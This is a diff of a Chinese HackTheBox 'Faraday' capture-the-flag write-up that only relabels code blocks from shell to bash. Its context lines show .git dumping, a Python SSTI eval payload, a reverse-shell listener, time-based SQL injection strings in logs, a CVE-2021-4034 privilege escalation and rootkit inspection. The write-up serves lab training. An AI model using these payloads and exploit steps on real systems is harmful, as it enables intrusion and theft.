@@ -98,7 +98,7 @@ This Fortress, created by Faraday, was designed not only as a puzzle, but mainly
 
 看起来是一种 smtp 客户端系统，在本地启动一个临时 smtp 服务器
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/HackTheBox-Fortresses-Faraday]
 └─$ sudo python3 -m smtpd -c DebuggingServer -n 10.10.16.2:25
 ```
@@ -123,7 +123,7 @@ This Fortress, created by Faraday, was designed not only as a puzzle, but mainly
 
 收到
 
-```shell
+```bash
 (py38) ┌──(randark ㉿ kali)-[~]
 └─$ python3 -m smtpd --debug -c DebuggingServer -n 10.10.16.2:8025
 DebuggingServer started at Fri Mar  8 18:09:24 2024
@@ -177,7 +177,7 @@ FARADAY{ehlo_@nd_w3lcom3!}
 
 发现存在 `.git` 目录，尝试使用 [Github - kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) 进行窃取
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/HackTheBox-Fortresses-Faraday]
 └─$ ~/tools/dvcs-ripper/rip-git.pl -v -u http://10.13.37.14/.git
 [i] Downloading git files from http://10.13.37.14/.git
@@ -618,7 +618,7 @@ c.__init__.__globals__[\'__builtins__\'].eval("__import__(\'os\').popen(\'ls /\'
 
 成功在侦听器上收到回连的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [18:35:40] Welcome to pwncat 🐈!
@@ -639,7 +639,7 @@ FARADAY{7x7_1s_n0t_@lw4ys_49}
 
 在服务的目录下，发现数据库目录
 
-```shell
+```bash
 (remote) root@98aa0f47eb96:/app# ls -lh
 total 40K
 drwxr-xr-x 2 root root 4.0K Jul 21  2021 __pycache__
@@ -657,7 +657,7 @@ total 24K
 
 将文件下载到本地
 
-```shell
+```bash
 (local) pwncat$ download ./db/database.db .
 ./db/database.db ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 24.6/24.6 KB • ? • 0:00:00
 [18:49:04] downloaded 24.58KiB in 2.12 seconds
@@ -665,7 +665,7 @@ total 24K
 
 并检测文件类型
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/HackTheBox-Fortresses-Faraday]
 └─$ file database.db
 database.db: SQLite 3.x database, last written using SQLite version 3016002, file counter 248, database pages 6, cookie 0x3, schema 4, UTF-8, version-valid-for 248
@@ -729,7 +729,7 @@ test:test
 
 使用 `pasta` 的凭据，成功登录 SSH 服务
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp/HackTheBox-Fortresses-Faraday]
 └─$ pwncat-cs pasta@10.13.37.14
 [19:04:27] Welcome to pwncat 🐈!
@@ -742,7 +742,7 @@ pasta
 
 在当前目录下，发现
 
-```shell
+```bash
 (remote) pasta@erlenmeyer:/home/pasta$ ls -lh
 total 24K
 -rwxr-xr-x 1 pasta pasta  17K Jul 16  2021 crackme
@@ -871,7 +871,7 @@ FARADAY{d0ubl3_@nd_f1o@t_be@uty}
 
 尝试连接
 
-```shell
+```bash
 (local) pwncat$ connect administrator@10.13.37.14
 Password: **********
 [19:17:28] 10.13.37.14:22: loaded known host from db
@@ -894,7 +894,7 @@ drwx------ 2 administrator administrator 4.0K Jul 16  2021 .cache
 
 在探测环境时，发现 `administrator` 有权限访问 apache 的日志
 
-```shell
+```bash
 (remote) administrator@erlenmeyer:/home/administrator$ find / -user administrator 2>/dev/null | grep -vE "/proc|/sys|/home|/run"
 /dev/pts/1
 /var/mail/administrator
@@ -903,7 +903,7 @@ drwx------ 2 administrator administrator 4.0K Jul 16  2021 .cache
 
 在日志文件中发现大量的 sql 注入痕迹
 
-```shell
+```bash
 7 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
 3004140 192.168.86.1 - - [20/Jul/2021:05:44:30 -0700] "GET /update.php?keyword=python%27%20WHERE%201462%3D1462%20AND%20%28SELECT%209551%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28query%20AS%20NCHAR%29%2C0x20%29%20FROM%20sys.x%24statements_with_temp_tables%20ORDER%20BY%20db%20LIMIT%201%2C1%29%2C56%2C1%29%29%3E16%2C0%2C3%29%29%29%29%29mURF%29--%20yPzW&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
 3004752 192.168.86.1 - - [20/Jul/2021:05:44:33 -0700] "GET /update.php?keyword=python%27%20WHERE%201462%3D1462%20AND%20%28SELECT%209551%20FROM%20%28SELECT%28SLEEP%283-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28query%20AS%20NCHAR%29%2C0x20%29%20FROM%20sys.x%24statements_with_temp_tables%20ORDER%20BY%20db%20LIMIT%201%2C1%29%2C56%2C1%29%29%3E24%2C0%2C3%29%29%29%29%29mURF%29--%20yPzW&text=python3 HTTP/1.1" 200 327 "http://192.168.86.128:80/update.php" "sqlmap/1.5.7.4#dev (http://sqlmap.org)"
@@ -995,7 +995,7 @@ FARADAY{@cc3ss_10gz_c4n_b3_use3fu111}
 
 在其中注意到 `/usr/bin/pkexec` 文件，尝试通过 CVE-2021-4034 利用
 
-```shell
+```bash
 (remote) administrator@erlenmeyer:/home/administrator$ python3 CVE-2021-4034.py
 [+] Creating shared library for exploit code.
 [-] GCONV_PATH=. directory already exists, continuing.
@@ -1023,7 +1023,7 @@ FARADAY{__1s_pR1nTf_Tur1ng_c0mPl3t3?__}
 
 根据之前的端口扫描得到的信息，端口 `8888` 还没有利用过，使用上文得到的凭据尝试连接，成功得到
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ nc 10.13.37.14 8888
 Welcome to FaradaySEC stats!!!
@@ -1041,7 +1041,7 @@ FARADAY{C_1s-0ld-Bu7_n0t-0bs0|3te}
 
 结合题目的名字，以及在 `/root` 目录下发现的
 
-```shell
+```bash
 (remote) root@erlenmeyer:/root# ls -lah
 total 15M
 drwx------  7 root root          4.0K Sep 14  2021 .
@@ -1075,7 +1075,7 @@ Searching for Reptile Rootkit...                            found it
 
 可以使用以下指令，实现对硬盘的提取与挂载，从而可以找到 `Reptile` 的实际部署位置为 `/reptileRoberto`
 
-```shell
+```bash
 sudo losetup /dev/loop10 sda3.image
 sudo kpartx -a /dev/loop10
 sudo vgdisplay -v | grep "LV Path"
@@ -1085,7 +1085,7 @@ mount /dev/ubuntu-vg/ubuntu-lv /mnt/
 
 进入 `Reptile` 的实际部署位置
 
-```shell
+```bash
 (remote) root@erlenmeyer:/# /reptileRoberto/reptileRoberto_cmd show
 Success!
 (remote) root@erlenmeyer:/# ls -lh /reptileRoberto/
